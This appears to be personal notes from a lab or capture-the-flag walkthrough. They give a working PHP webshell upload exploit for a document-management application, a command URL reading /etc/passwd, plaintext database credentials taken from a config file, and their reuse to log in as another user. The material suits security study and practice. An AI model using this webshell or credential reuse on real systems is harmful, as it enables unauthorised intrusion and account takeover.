```php
Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code:
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```


![[Pasted image 20211227231052.png]]


![[Pasted image 20211227231239.png]]

* the system doens't let us to have a reverse shell
* cathing info about mysql on settings.xml
![[Pasted image 20211227232619.png]]
dbUser="seeddms" dbPass="ied^ieY6xoquu"

Pass: ied^ieY6xoquu

* Try login in on port 9090 with this password, using user michelle

* Login sucessful as michelle:ied^ieY6xoquu
![[Pasted image 20211227232838.png]]